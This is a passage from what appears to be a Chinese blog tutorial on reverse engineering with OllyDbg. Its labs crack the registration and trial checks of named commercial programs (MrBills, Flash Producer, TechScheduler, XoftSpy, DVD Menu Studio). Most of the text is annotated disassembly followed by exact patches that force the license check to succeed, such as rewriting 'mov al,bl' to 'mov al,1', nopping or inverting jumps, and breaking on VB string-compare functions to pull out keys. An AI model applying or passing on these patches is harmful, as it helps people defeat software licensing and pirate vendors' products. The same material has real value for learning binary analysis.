要实现跳转\n```\n\n在call指令下断点，重载运行。输入邮箱和证书运行到断点位置。进入函数1，里面还有很多个函数，先看第1个把它注释为“需进入2”，下面函数还需不需要进入要看第1个函数下面的跳转指令会不会跳过下面的函数。先不要进入第1个函数，F8往下走走。\n\n```asm\n0040714C   $  55            push ebp\n0040714D   .  8BEC          mov ebp,esp\n0040714F   .  FF75 0C       push dword ptr ss:[ebp+0xC]\n00407152   .  FF75 08       push dword ptr ss:[ebp+0x8]              ;  MrBills.004C1014\n00407155   .  E8 77FEFFFF   call MrBills.00406FD1\t\t\t\t;需进入2\n0040715A   .  84C0          test al,al\t\t\t\t\t\t\t;al=00,Z=1\n0040715C   .  59            pop ecx                                  ;  MrBills.004299B2\n0040715D   .  59            pop ecx                                  ;  MrBills.004299B2\n0040715E   .  A2 A0765000   mov byte ptr ds:[0x5076A0],al\n00407163   .  75 1B         jnz short MrBills.00407180\t\t\t;跳转未实现\n00407165   .  FF75 0C       push dword ptr ss:[ebp+0xC]\n00407168   .  FF75 08       push dword ptr ss:[ebp+0x8]              ;  MrBills.004C1014\n0040716B   .  E8 ADFEFFFF   call MrBills.0040701D\t\t\t\t;需进入3\n00407170   .  84C0          test al,al\t\t\t\t\t\t\t;al=00,Z=1\n00407172   .  59            pop ecx                                  ;  MrBills.004299B2\n00407173   .  59            pop ecx                                  ;  MrBills.004299B2\n00407174   .  A2 A0765000   mov byte ptr ds:[0x5076A0],al\n00407179   .  A2 A2765000   mov byte ptr ds:[0x5076A2],al\n0040717E   .  74 0D         je short MrBills.0040718D\t\t\t;跳转实现\n00407180   >  FF75 0C       push dword ptr ss:[ebp+0xC]\n00407183   .  FF75 08       push dword ptr ss:[ebp+0x8]\n00407186   .  E8 45F8FFFF   call MrBills.004069D0\t\t\t\t;被跳过，无需理会\n0040718B   .  59            pop ecx                                  ;  00199DEC\n0040718C   .  59            pop ecx                                  ;  00199DEC\n0040718D   >  5D            pop ebp                                  ;  00199DEC\n0040718E   .^ E9 D6FEFFFF   jmp MrBills.00407069\t\n;跳到上面执行，eax存的是地址，不管，最后返回到函数1\n```\n\n函数1的整体逻辑弄懂了，现在继续看函数2。\n\n```asm\n00406FD1  /$  B8 AB374B00   mov eax,MrBills.004B37AB\n00406FD6  |.  E8 EDF00700   call MrBills.004860C8;经过这条指令，eax存的是地址，不是返回值\n00406FDB  |.  51            push ecx\n00406FDC  |.  53            push ebx\n00406FDD  |.  FF35 A4415000 push dword ptr ds:[0x5041A4]             ;  ORUWOZ3FOI\n00406FE3  |.  8D4D F0       lea ecx,[local.4]\n00406FE6  |.  E8 84B1FFFF   call MrBills.0040216F;同上不是\n00406FEB  |.  FF75 0C       push [arg.2]\n00406FEE  |.  8365 FC 00    and [local.1],0x0\n00406FF2  |.  FF75 08       push [arg.1]\n00406FF5  |.  8D45 F0       lea eax,[local.4]\n00406FF8  |.  50            push eax\n00406FF9  |.  E8 4DFFFFFF   call MrBills.00406F4B;经过这条指令，al=00,需进入4\n00406FFE  |.  8B4D F0       mov ecx,[local.4]\n00407001  |.  83C4 0C       add esp,0xC\n00407004  |.  83C1 F0       add ecx,-0x10\n00407007  |.  8AD8          mov bl,al;用bl存放al的值\n00407009  |.  E8 3AA1FFFF   call MrBills.00401148\n0040700E  |.  8B4D F4       mov ecx,[local.3]\n00407011  |.  8AC3          mov al,bl;用al存放bl的值\n;al给bl，bl又给回al，中间有call指令，涉及两种情况：①保护现场，②传参。在这里猜测bl暂存al的值，中间的call指令要用到al，等call指令用完al，bl把值还给al。起到保护现场作用。也可以推测在call指令前al存的就很有可能是注册或未注册的返回值，所以al=00那个call指令是一定要进入的(需进入4)\n00407013  |.  5B            pop ebx                                  ;  00199D98\n00407014  |.  64:890D 00000>mov dword ptr fs:[0],ecx\n0040701B  |.  C9            leave\n0040701C  \\.  C3            retn;退出函数2\n```\n\n如果不确定要不要进入某个函数，可以按回车查看函数内部代码，但并不执行。想进去就按F7，不想进去就按F8。\n\n进入函数4：\n\n```asm\n00406F4B  /$  B8 E9374B00   mov eax,MrBills.004B37E9\n00406F50  |.  E8 73F10700   call MrBills.004860C8\n00406F55  |.  51            push ecx\n00406F56  |.  8B45 08       mov eax,[arg.1]\n00406F59  |.  53            push ebx\n00406F5A  |.  56            push esi                                 ;  MrBills.00507738\n00406F5B  |.  FF30          push dword ptr ds:[eax]\n00406F5D  |.  8D45 08       lea eax,[arg.1]\n00406F60  |.  50            push eax\n00406F61  |.  E8 38FBFFFF   call MrBills.00406A9E\n00406F66  |.  8B45 0C       mov eax,[arg.2]\n00406F69  |.  FF30          push dword ptr ds:[eax]\n00406F6B  |.  8365 FC 00    and [local.1],0x0\n00406F6F  |.  8D45 F0       lea eax,[local.4]\n00406F72  |.  50            push eax\n00406F73  |.  E8 26FBFFFF   call MrBills.00406A9E\n00406F78  |.  FF75 10       push [arg.3]\n00406F7B  |.  C645 FC 01    mov byte ptr ss:[ebp-0x4],0x1\n00406F7F  |.  50            push eax\n00406F80  |.  8D45 08       lea eax,[arg.1]\n00406F83  |.  50            push eax\n00406F84  |.  8D45 0C       lea eax,[arg.2]\n00406F87  |.  50            push eax\n00406F88  |.  E8 89FDFFFF   call MrBills.00406D16\n00406F8D  |.  FF30          push dword ptr ds:[eax]\n00406F8F  |.  8B75 08       mov esi,[arg.1]\n00406F92  |.  56            push esi                                 ;  MrBills.00507738\n00406F93  |.  E8 4FF10700   call MrBills.004860E7\n00406F98  |.  8B4D 0C       mov ecx,[arg.2];al=01,bl=00\n00406F9B  |.  83C4 28       add esp,0x28\n00406F9E  |.  8BD8          mov ebx,eax\n00406FA0  |.  F7DB          neg ebx\n00406FA2  |.  1ADB          sbb bl,bl\n00406FA4  |.  83C1 F0       add ecx,-0x10\n00406FA7  |.  FEC3          inc bl\n00406FA9  |.  E8 9AA1FFFF   call MrBills.00401148\n00406FAE  |.  8B4D F0       mov ecx,[local.4]\n00406FB1  |.  83C1 F0       add ecx,-0x10\n00406FB4  |.  E8 8FA1FFFF   call MrBills.00401148\n00406FB9  |.  8D4E F0       lea ecx,dword ptr ds:[esi-0x10]\n00406FBC  |.  E8 87A1FFFF   call MrBills.00401148\n00406FC1  |.  8B4D F4       mov ecx,[local.3]\n00406FC4  |.  5E            pop esi                                  ;  MrBills.00406FFE\n00406FC5  |.  8AC3          mov al,bl\n00406FC7  |.  5B            pop ebx      ;al=00,bl=00                            ;  MrBills.00406FFE\n00406FC8  |.  64:890D 00000>mov dword ptr fs:[0],ecx\n00406FCF  |.  C9            leave\n00406FD0  \\.  C3            retn\n```\n\n所以在这个决定al的值的函数4，是通过改变bl间接赋给al返回值。\n\n函数4和函数2执行完，接下来执行的是函数3。\n\n```asm\n0040701D  /$  B8 AB374B00   mov eax,MrBills.004B37AB\n00407022  |.  E8 A1F00700   call MrBills.004860C8\n00407027  |.  51            push ecx\n00407028  |.  53            push ebx\n00407029  |.  FF35 A0415000 push dword ptr ds:[0x5041A0]             ;  OBZG65DJM4\n0040702F  |.  8D4D F0       lea ecx,[local.4]\n00407032  |.  E8 38B1FFFF   call MrBills.0040216F\n00407037  |.  FF75 0C       push [arg.2]\n0040703A  |.  8365 FC 00    and [local.1],0x0\n0040703E  |.  FF75 08       push [arg.1]\n00407041  |.  8D45 F0       lea eax,[local.4]\n00407044  |.  50            push eax\n00407045  |.  E8 01FFFFFF   call MrBills.00406F4B;这个也是函数4\n;有没有觉得似曾相识？接下来的代码跟函数2的代码一模一样，表明它们用的算法思路是一样的，或者加强检验\n0040704A  |.  8B4D F0       mov ecx,[local.4]\n0040704D  |.  83C4 0C       add esp,0xC\n00407050  |.  83C1 F0       add ecx,-0x10\n00407053  |.  8AD8          mov bl,al\n00407055  |.  E8 EEA0FFFF   call MrBills.00401148\n0040705A  |.  8B4D F4       mov ecx,[local.3]                        ;  MrBills.00407170\n0040705D  |.  8AC3          mov al,bl\n0040705F  |.  5B            pop ebx                                  ;  MrBills.00407170\n00407060  |.  64:890D 00000>mov dword ptr fs:[0],ecx\n00407067  |.  C9            leave\n00407068  \\.  C3            retn\n```\n\n弄明白逻辑，现在来修改函数。先修改函数2，不行再修改函数3(如果是加强检验)。\n\n进入函数1->进入函数2->进入函数4，找到关键点，也就是bl赋值给al的指令\n\n```asm\n00406FC4  |.  5E            pop esi                                  ;  MrBills.00406FFE\n00406FC5  |.  8AC3          mov al,bl\n00406FC7  |.  5B            pop ebx      ;al=00,bl=00                            ;  MrBills.00406FFE\n```\n\n```asm\nmov al,bl\t\t\t=>\t\t\tmov al,1\n```\n\n运行，这样才算是成功了。\n\n{% asset_img 实验8.4.png 实验8.4 %}\n\n{% asset_img 实验8.5.png 实验8.5 %}\n\n## 16. 针对性逆向\n\n掌握不同编译器编译出来的程序的特点，然后才能有针对性地进行逆向。\n\n查壳工具：exeinfope.exe\n\n### 16.1 Visual BASIC(实验九)\n\nVB是由早期DOS时代的BASIC语言发展而来的可视化编程语言。VB是由事件驱动的编程语言。VB语言用的是Unicode编码。\n\n所有的VB程序几乎都是依赖于一个外部的动态链接库`MSVBVM60.dll`。正是因为VB中所有的API函数都在dll中去实现，所以导致在跟踪程序的执行代码时频繁地在dll领空和程序领空横跳。正因为如此，VB程序很难在函数内修改返回值，而且没有`MessageBox`函数，它的弹窗是`tcMsgBox`函数。\n\n#### 16.1.1 VB破解的关键\n\n| 针对变量           | 针对字符串             |\n| ------------------ | ---------------------- |\n| **__vbaVarTstEq**  | **__vbaStrCmp**        |\n| __vbaVarTstNe      | __vbaStrComp           |\n| **__vbaVarCompEq** | __vbaStrCompVar        |\n| __vbaVarCompLe     | __vbaStrLike           |\n| __vbaVarCompLt     | __vbaStrTextComp       |\n| __vbaVarCompGe     | __vbaStrTextLike       |\n| __vbaVarCompGt     |                        |\n| __vbaVarCompNe     | 加粗都是比较常用的函数 |\n\n在一个VB写成的程序中需要注册码，如何破解？VB程序在装载时会结合硬件信息生成一个独一无二的Key(注册码)。在OD中载入程序，Ctrl+N打开输入输出表(N图标)，直接输入需要查找的函数，在标题处会显示输入的字母，选中函数右键->在每个参考上设置断点。重载运行，停到断点处后F8单步步过，如果整个程序走完了还没看到Key，那就换一个函数继续找。它的Key就在注释窗口处，很容易被找到。\n\n就算把程序卸载后重装，它还是已经注册好了。\n\n### 16.2 Delphi(实验十)\n\n非常多的call指令。\n\n```asm\npush 004A52F4\n……\nretn\t\t\t\t\t;相当于jmp 004A52F4\n```\n\n`-`返回上一条指令查看，但程序已经执行到下面一条指令了。\n\n## 17. 实验九 Flash Producer\n\n{% asset_img 实验9.png 实验9 %}\n\n{% asset_img 实验9.1.png 实验9 %}\n\n目标：破解程序。\n\n{% asset_img 实验9.2.png 实验9 %}\n\n既然认识了查壳工具，那就用用它吧。可以知道它是32位exe文件，用C++编译，无壳。\n\n载入OD，在注册时弹窗“Invalid Password”，试试搜索字符串。右键->中文搜索引擎->智能搜索，查找字符串，定位到反汇编窗口。\n\n```asm\n00404851   .  68 34034300   push fjproduc.00430334                   ;  v5le0n9\n;push用户输入的password，接下来的函数就是判断password对错\n00404856   .  E8 E5FDFFFF   call fjproduc.00404640\n0040485B   .  83C4 04       add esp,0x4;al=00\n0040485E   .  84C0          test al,al;按位与为0时Z置1，非0置0\n00404860   .  74 35         je short fjproduc.00404897;相等跳转，与jz用法相同。Z为1跳转\n00404862   .  8B0D ACE34200 mov ecx,dword ptr ds:[0x42E3AC]          ;  Password\n00404868   .  68 60034300   push fjproduc.00430360                   ; /FileName = \"\"\n0040486D   .  68 34034300   push fjproduc.00430334                   ; |String = \"\"\n00404872   .  51            push ecx                                 ; |Key = \"j`h犬B\"\n00404873   .  68 149D4200   push fjproduc.00429D14                   ; |Registration\n00404878   .  FF15 28904200 call dword ptr ds:[<&KERNEL32.WritePriva>; \\WritePrivateProfileStringA\n0040487E   .  6A 01         push 0x1\n00404880   .  E8 5BFEFFFF   call fjproduc.004046E0\n00404885   .  83C4 04       add esp,0x4\n00404888   >  6A 01         push 0x1                                 ; /Result = 0x1\n0040488A   .  56            push esi                                 ; |hWnd = 004203BB\n0040488B   .  FF15 2C924200 call dword ptr ds:[<&USER32.EndDialog>]  ; \\EndDialog\n00404891   .  33C0          xor eax,eax\n00404893   .  5E            pop esi                                  ;  kernel32.74F60419\n00404894   .  C2 1000       retn 0x10\n00404897   >  6A 30         push 0x30                                ; /Style = MB_OK|MB_ICONEXCLAMATION|MB_APPLMODAL\n00404899   .  68 A49B4200   push fjproduc.00429BA4                   ; |Error\n0040489E   .  68 409D4200   push fjproduc.00429D40                   ; |Invalid Password\n004048A3   .  56            push esi                                 ; |hOwner = 004203BB\n004048A4   .  FF15 48924200 call dword ptr ds:[<&USER32.MessageBoxA>>; \\MessageBoxA\n```\n\n可以看到4897地址有一个被指向符号，是从4860地址的跳转指令跳过来的。跳转指令上方有个调用指令，有个改变Z标志位的test指令。在call指令处下断点，进入到被调用函数。\n\n```asm\n00404640  /$  83EC 2C       sub esp,0x2C\n00404643  |.  56            push esi                                 ;  fjproduc.00430334\n00404644  |.  8B7424 34     mov esi,dword ptr ss:[esp+0x34]          ;  fjproduc.00430334\n00404648  |.  8BC6          mov eax,esi                              ;  fjproduc.00430334\teax=v5le0n9\n0040464A  |.  8D50 01       lea edx,dword ptr ds:[eax+0x1];edx=5le0n9\n;lea指令用于把源操作数的地址偏移量传送目的操作数\n0040464D  |.  8D49 00       lea ecx,dword ptr ds:[ecx]\n00404650  |>  8A08          /mov cl,byte ptr ds:[eax];将v赋值到cl\n00404652  |.  40            |inc eax                                 ;  fjproduc.00430334\teax指向5\n00404653  |.  84C9          |test cl,cl;按位与cl\n00404655  |.^ 75 F9         \\jnz short fjproduc.00404650;eax不为空则跳转\n00404657  |.  2BC2          sub eax,edx\n00404659  |.  83F8 04       cmp eax,0x4;eax长度与4对比\n0040465C  |.  73 07         jnb short fjproduc.00404665\n;jump if not below 如果eax长度不小于4则跳转(password要4个字符以上)\n0040465E  |>  32C0          xor al,al;al=00\n;从下面的jnz跳到这里，往下执行退出函数，一种改法：xor al,al\t=>\tmov al,1\n;类似于if(xxx) return 1;else return 1;\n00404660  |.  5E            pop esi                                  ;  fjproduc.00430334\n00404661  |.  83C4 2C       add esp,0x2C\n00404664  |.  C3            retn\n00404665  |>  6A 03         push 0x3\n00404667  |.  68 C49C4200   push fjproduc.00429CC4                   ;  fjr\n0040466C  |.  56            push esi                                 ;  fjproduc.00430334  esi指向v5le0n9\n0040466D  |.  E8 6EAA0100   call fjproduc.0041F0E0\n;猜测上面操作只是为了要求password在4个字符以上，这个函数才是判断password是否有效的一部分\n;上面3个push是为调用函数传参\n;结合下面468B地址中esi=e0n9,可知这个函数用了前三个v5l与fjr比较，也就是说password必须以fjr为前缀\n00404672  |.  83C4 0C       add esp,0xC;al=01\n00404675  |.  85C0          test eax,eax                             ;  fjproduc.00430334\n00404677  |.^ 75 E5         jnz short fjproduc.0040465E\n;jump if not zero 按位与不为0则跳转退出函数;先修改这里让它往下走\n00404679  |.  68 B8E04200   push fjproduc.0042E0B8                   ;  0123456789abcdefghijklmnopqrstuvwxyz\n;这个奇奇怪怪又有规律的字符串一定有猫腻\n0040467E  |.  8D4424 08     lea eax,dword ptr ss:[esp+0x8]\n00404682  |.  50            push eax                                 ;  fjproduc.00430334\n00404683  |.  8D4C24 10     lea ecx,dword ptr ss:[esp+0x10]\n00404687  |.  51            push ecx                                 ;  user32.76DE97B6\n00404688  |.  83C6 03       add esi,0x3\n0040468B  |.  56            push esi                                 ;  fjproduc.00430334\tesi=e0n9\n0040468C  |.  E8 7FE40000   call fjproduc.00412B10\n;传了4个参数给2B10函数，其中包括用户输入的password,所以这个函数也是判断password的一部分\n00404691  |.  8B4424 14     mov eax,dword ptr ss:[esp+0x14];eax=03\n00404695  |.  83C4 10       add esp,0x10\n00404698  |.  83F8 08       cmp eax,0x8\n0040469B  |.^ 7C C1         jl short fjproduc.0040465E;eax小于8跳转，退出函数\n;ZF=0,且SF⊕OF=1，这里不让它跳，所以修改SF或OF\n0040469D  |.  68 0C034300   push fjproduc.0043030C                   ;  ASCII \"-1568272844\"\n004046A2  |.  E8 F9E20000   call fjproduc.004129A0\n004046A7  |.  83C4 04       add esp,0x4;eax=0b\tesp存的是v5le0n9(长度为7)\n004046AA  |.  33F6          xor esi,esi                              ;  fjproduc.00430334\n004046AC  |.  8D6424 00     lea esp,dword ptr ss:[esp]\n;edx=1568272844\n004046B0  |>  33D2          /xor edx,edx;edx=0\n004046B2  |.  8A5434 08     |mov dl,byte ptr ss:[esp+esi+0x8]\n004046B6  |.  52            |push edx;edx=c5\n004046B7  |.  E8 84E30000   |call fjproduc.00412A40\n004046BC  |.  83C4 04       |add esp,0x4\n004046BF  |.  884434 08     |mov byte ptr ss:[esp+esi+0x8],al\n004046C3  |.  46            |inc esi                                 ;  fjproduc.00430334\n004046C4  |.  83FE 04       |cmp esi,0x4\n004046C7  |.^ 7C E7         \\jl short fjproduc.004046B0;循环4次\n004046C9  |.  807C24 0B 5F  cmp byte ptr ss:[esp+0xB],0x5F\n004046CE  |.  0f94c0        sete al;al=ZF=0\n004046D1  |.  5E            pop esi                                  ;  fjproduc.00430334\n004046D2  |.  83C4 2C       add esp,0x2C\n004046D5  \\.  C3            retn\n```\n\n另一种改法：\n\n```asm\njnz short fjproduc.0040465E\t\t\t=>\t\tjz short fjproduc.0040465E\njl short fjproduc.0040465E\t\t\t=>\t\tjnl short fjproduc.0040465E\nsete al\t\t\t\t\t\t\t\t=>\t\tmov al,1\n```\n\n{% asset_img 实验9.3.png 实验9.3 %}\n\n应该还有第三种改法，按照它的算法前缀为frj开头之类的...好难不会\n\n## 18. 实验十 TechScheduler\n\n{% asset_img 实验10.png 实验10 %}\n\n{% asset_img 实验10.1.png 实验10.1 %}\n\n{% asset_img 实验10.2.png 实验10.2 %}\n\n目标：破解注册。\n\n{% asset_img 实验10.3.png 实验10.3 %}\n\n是32位下的Delphi可执行文件，意味着有很多的函数调用。\n\n右键->中文搜索引擎->智能搜索，搜索`first name`可搜到“Enter a First Name value now...”，往下看看还有“Registration Key accepted!”字样，双击定位到接受注册密钥的汇编代码处。\n\n往上找找到当前的函数入口处，期间可以看到注释窗口很多“first name”, “last name”, “error”之类的，尝试在函数的某个地方下断点，看是否会停到断点处。停到断点处后F8往下执行，直到运行到错误弹框出现，用nop填充。(为什么要用nop填充而不是跟进去？可能是最后是去到了dll领空，我们改不了)保存文件。\n\n重载运行，跟上面实验一样关注修改跳转语句，修改运行到“Registration Key accepted!”即可。\n\n{% asset_img 实验10.4.png 实验10.4 %}\n\n这里我讲得有点空，看多几遍视频就可理解了。[小甲鱼OD使用教程12](https://www.bilibili.com/video/BV1gs411P7A1?p=16) \n\n## 19. 实验十一 XoftSpy\n\n{% asset_img 实验11.png 实验11 %}\n\n目标：实现注册。\n\n{% asset_img 实验11.1.png 实验11.1 %}\n\n通常从程序的对话框里面获取字符串，一般都是调用API函数`GetWindowText`。\n\n方法一：OD载入程序，右键->查找->所有模块间的调用，直接键盘输入查找`GetWindowText`。选中右键->在每个调用到GetWindowTextA上设置断点。可以Alt+B查看在哪里设置了断点，有几个断点。\n\n方法二：Ctrl+N，直接键盘输入查找`GetWindowText`。选中右键->在每个参考上设置断点。\n\n运行程序，发现程序还没完全打开时就停在了断点处，肯定不是我们想去到的地方。我们需要的是在输入Key点OK后的那个断点。\n\nF8走走，再F9运行重复几次，发现回到那个断点处3次，应该是每次获取一个框的内容。之后一路F8，直到在信息窗口或在寄存器窗口或在堆栈窗口看到刚才我们输入的东西时要格外留心，再看到条件跳转指令要注意跳到哪里。注释窗口出现关键字符串“Congratulations!”，在004174E3地址有个箭头，可以在信息窗口看到跳转来自00417465和0041749C。选中信息窗口的“跳转来自”右键，分别去到两个地址处。发现它们调用的是同一个函数，也就是算法实现是一样的。\n\n```asm\n0041745E   .  E8 2D020000   call XoftSpy.00417690                    ;  很有可能是关键函数\n00417463   .  84C0          test al,al\n00417465   .  75 7C         jnz short XoftSpy.004174E3               ;  实现跳转\n00417467   .  51            push ecx\n00417468   .  8D5424 14     lea edx,dword ptr ss:[esp+0x14]\n0041746C   .  8BCC          mov ecx,esp\n0041746E   .  896424 20     mov dword ptr ss:[esp+0x20],esp\n00417472   .  52            push edx\n00417473   .  E8 9D6A0400   call XoftSpy.0045DF15\n00417478   .  51            push ecx\n00417479   .  8D4424 1C     lea eax,dword ptr ss:[esp+0x1C]\n0041747D   .  8BCC          mov ecx,esp\n0041747F   .  896424 20     mov dword ptr ss:[esp+0x20],esp\n00417483   .  50            push eax\n00417484   .  C64424 34 03  mov byte ptr ss:[esp+0x34],0x3\n00417489   .  E8 876A0400   call XoftSpy.0045DF15\n0041748E   .  8BCE          mov ecx,esi\n00417490   .  C64424 30 01  mov byte ptr ss:[esp+0x30],0x1\n00417495   .  E8 F6010000   call XoftSpy.00417690                    ;  很有可能是关键函数\n0041749A   .  84C0          test al,al\n0041749C      75 45         jnz short XoftSpy.004174E3               ;  实现跳转\n0041749E   .  6A 00         push 0x0\n004174A0   .  68 04544800   push XoftSpy.00485404                    ;  ASCII \"XoftSpy\"\n004174A5   .  68 C4684800   push XoftSpy.004868C4                    ;  ASCII \"Invalid code.\"\n004174AA   .  8BCE          mov ecx,esi\n004174AC   .  E8 664F0400   call XoftSpy.0045C417\n004174B1   .  68 48FA4800   push XoftSpy.0048FA48\n004174B6   .  8BCD          mov ecx,ebp\n004174B8   .  E8 206E0400   call XoftSpy.0045E2DD\n004174BD   .  68 48FA4800   push XoftSpy.0048FA48\n004174C2   .  8BCF          mov ecx,edi\n004174C4   .  E8 146E0400   call XoftSpy.0045E2DD\n004174C9   .  68 48FA4800   push XoftSpy.0048FA48\n004174CE   .  8BCB          mov ecx,ebx\n004174D0   .  E8 086E0400   call XoftSpy.0045E2DD\n004174D5   .  6A 00         push 0x0\n004174D7   .  8BCE          mov ecx,esi\n004174D9   .  E8 03590400   call XoftSpy.0045CDE1\n004174DE   .  E9 9D000000   jmp XoftSpy.00417580\n004174E3   >  57            push edi\n004174E4   .  55            push ebp\n004174E5   .  E8 769D0100   call XoftSpy.00431260\n004174EA   .  83C4 08       add esp,0x8\n004174ED   .  8BCE          mov ecx,esi\n004174EF   .  6A 00         push 0x0\n004174F1   .  68 04544800   push XoftSpy.00485404                    ;  ASCII \"XoftSpy\"\n004174F6   .  68 98684800   push XoftSpy.00486898                    ;  ASCII \"Congratulations! successfully registered\"\n004174FB   .  E8 174F0400   call XoftSpy.0045C417\n```\n\n在00417465地址处下断点跟进。粗略看一下，发现函数有两个返回。一个是要al=1，另一个是要al=0，通常程序都是1表示已注册，0表示未注册。\n\n```asm\n00417894  |.  E8 07690400   call XoftSpy.0045E1A0\n00417899  |.  5F            pop edi                                  ;  XoftSpy.00417463\n0041789A  |.  5E            pop esi                                  ;  XoftSpy.00417463\n0041789B  |.  B0 01         mov al,0x1\n0041789D  |.  5B            pop ebx                                  ;  XoftSpy.00417463\n0041789E  |.  8B4C24 1C     mov ecx,dword ptr ss:[esp+0x1C]\n004178A2  |.  64:890D 00000>mov dword ptr fs:[0],ecx\n004178A9  |.  83C4 28       add esp,0x28\n004178AC  |.  C2 0800       retn 0x8\n```\n\n```asm\n0041790F  |.  E8 8C680400   call XoftSpy.0045E1A0\n00417914  |.  8B4C24 28     mov ecx,dword ptr ss:[esp+0x28]\n00417918  |.  5F            pop edi                                  ;  XoftSpy.00417463\n00417919  |.  5E            pop esi                                  ;  XoftSpy.00417463\n0041791A  |.  32C0          xor al,al\n0041791C  |.  5B            pop ebx                                  ;  XoftSpy.00417463\n0041791D  |.  64:890D 00000>mov dword ptr fs:[0],ecx\n00417924  |.  83C4 28       add esp,0x28\n00417927  \\.  C2 0800       retn 0x8\n```\n\n往上找找跳转指令\n\n```asm\n00417800  |. /0F85 A9000000 jnz XoftSpy.004178AF\n00417806  |. |3BFA          cmp edi,edx\n00417808  |. |0F85 A1000000 jnz XoftSpy.004178AF\n0041780E  |. |3BD8          cmp ebx,eax\n00417810  |. |0F85 99000000 jnz XoftSpy.004178AF\n00417816  |. |8B4424 20     mov eax,dword ptr ss:[esp+0x20]\n0041781A  |. |B9 0A000000   mov ecx,0xA\n0041781F  |. |99            cdq\n00417820  |. |F7F9          idiv ecx\n00417822  |. |8B4424 24     mov eax,dword ptr ss:[esp+0x24]\n00417826  |. |BE 0A000000   mov esi,0xA\n0041782B  |. |8BCA          mov ecx,edx\n0041782D  |. |99            cdq\n0041782E  |. |F7FE          idiv esi\n00417830  |. |3BD1          cmp edx,ecx\n00417832  |. |75 7B         jnz short XoftSpy.004178AF               ;  不能实现\n```\n\n将这一连串的跳转指令全都nop掉试试，弹窗注册成功。\n\n{% asset_img 实验13.4.png 实验13.4 %}\n\n但它还是说还没有注册。\n\n{% asset_img 实验13.3.png 实验13.3 %}\n\n那查找一下字符串，右键->中文搜索引擎->智能搜索，找到字符串所在的汇编代码处。在所在函数的入口点下断点。重载运行，在界面按下“About”时停在了断点处，F8往下执行。\n\n```asm\n00401492   .  E8 093C0300   call XoftSpy1.004350A0\n00401497   .  84C0          test al,al\n00401499   .  74 12         je short XoftSpy1.004014AD;不能跳，即al不能等于0\n0040149B   .  68 C4514800   push XoftSpy1.004851C4                   ;  This license of XoftSpy has been registered\n004014A0   .  8D4C24 08     lea ecx,dword ptr ss:[esp+0x8]\n004014A4   .  E8 34CE0500   call XoftSpy1.0045E2DD\n004014A9   .  6A 00         push 0x0\n004014AB   .  EB 10         jmp short XoftSpy1.004014BD\n004014AD   >  68 94514800   push XoftSpy1.00485194                   ;  This XoftSpy license has not been registered\n004014B2   .  8D4C24 08     lea ecx,dword ptr ss:[esp+0x8]\n004014B6   .  E8 22CE0500   call XoftSpy1.0045E2DD\n```\n\n在00401492处下断点跟进，粗略看一下发现只有一个返回点。在返回点附近格外关注al的值。由于al的值是bl赋予的，所以再往上看就要关注bl的值。\n\n```asm\n00435219  |. /75 3A         jnz short XoftSpy1.00435255              ;  跳转\n0043521B  |. |51            push ecx\n0043521C  |. |8D5424 14     lea edx,dword ptr ss:[esp+0x14]\n00435220  |. |8BCC          mov ecx,esp\n00435222  |. |896424 24     mov dword ptr ss:[esp+0x24],esp\n00435226  |. |52            push edx\n00435227  |. |E8 E98C0200   call XoftSpy1.0045DF15\n0043522C  |. |51            push ecx\n0043522D  |. |8D4424 1C     lea eax,dword ptr ss:[esp+0x1C]\n00435231  |. |8BCC          mov ecx,esp\n00435233  |. |896424 24     mov dword ptr ss:[esp+0x24],esp\n00435237  |. |50            push eax\n00435238  |. |C64424 38 07  mov byte ptr ss:[esp+0x38],0x7\n0043523D  |. |E8 D38C0200   call XoftSpy1.0045DF15\n00435242  |. |8BCE          mov ecx,esi\n00435244  |. |885C24 34     mov byte ptr ss:[esp+0x34],bl\n00435248  |. |E8 63000000   call XoftSpy1.004352B0\n0043524D  |. |84C0          test al,al\n0043524F  |. |75 04         jnz short XoftSpy1.00435255\n00435251  |. |32DB          xor bl,bl;bl=0\n00435253  |. |EB 02         jmp short XoftSpy1.00435257\n00435255  |> \\B3 01         mov bl,0x1;bl=1\n00435257  |>  8D4C24 10     lea ecx,dword ptr ss:[esp+0x10]\n0043525B  |.  C64424 2C 04  mov byte ptr ss:[esp+0x2C],0x4\n00435260  |.  E8 3B8F0200   call XoftSpy1.0045E1A0\n00435265  |.  8D4C24 14     lea ecx,dword ptr ss:[esp+0x14]\n00435269  |.  C64424 2C 01  mov byte ptr ss:[esp+0x2C],0x1\n0043526E  |.  E8 2D8F0200   call XoftSpy1.0045E1A0\n00435273  |.  8D4C24 08     lea ecx,dword ptr ss:[esp+0x8]\n00435277  |.  C64424 2C 00  mov byte ptr ss:[esp+0x2C],0x0\n0043527C  |.  E8 1F8F0200   call XoftSpy1.0045E1A0\n00435281  |.  8D4C24 0C     lea ecx,dword ptr ss:[esp+0xC]\n00435285  |.  C74424 2C FFF>mov dword ptr ss:[esp+0x2C],-0x1\n0043528D  |.  E8 0E8F0200   call XoftSpy1.0045E1A0\n00435292  |.  8B4C24 24     mov ecx,dword ptr ss:[esp+0x24]\n00435296  |.  8AC3          mov al,bl\n00435298  |.  5E            pop esi                                  ;  0019BFFC\n00435299  |.  64:890D 00000>mov dword ptr fs:[0],ecx\n004352A0  |.  5B            pop ebx                                  ;  0019BFFC\n004352A1  |.  83C4 28       add esp,0x28\n004352A4  \\.  C3            retn\n```\n\n这个程序有很多修改的方法\n\n```asm\n方法一\n00435296  |.  8AC3          mov al,bl\t\t=>\t\tmov al,1\n\n方法二\n00435219  |. /75 3A         jnz short XoftSpy1.00435255 => jmp short XoftSpy1.00435255\n\n方法三\n0043524F  |. |75 04         jnz short XoftSpy1.00435255\t=> jmp short XoftSpy1.00435255\n```\n\n以上三种方法都能成功注册，也没有了注册按钮，说明程序成功破解。\n\n{% asset_img 实验13.5.png 实验13.5 %}\n\n所以在这个程序中，搜索API函数的方法是错误的，是程序发明者挖的坑，故意让我们跳进去。而搜索字符串才能破解成功。当程序发明者有了逆向意识，不想让我们破解程序，就会制造很多坑让我们踩，这时搜索API函数和字符串其实都会让我们踩坑，最好的办法就是查看调用堆栈。\n\n### 19.1 常用的定位方法\n\n- 查找字符串(11.1)\n\n- 查找API函数(破解常用API函数大全.chm)\n\n## 20. Inline patch(内嵌补丁)\n\n内嵌补丁在加壳软件的破解上用得比较多，但不是加壳的也可以用。内嵌补丁指在程序文件中把补丁代码写入文件里达到破解的目的。\n\n## 21. 实验十二 DVD menu studio\n\n{% asset_img 实验12.png 实验12 %}\n\n目标：破解过期程序。\n\n由于这个程序还有30天可用，把时间调到未来再打开就可以过期了。\n\n{% asset_img 实验12.1.png 实验12.1 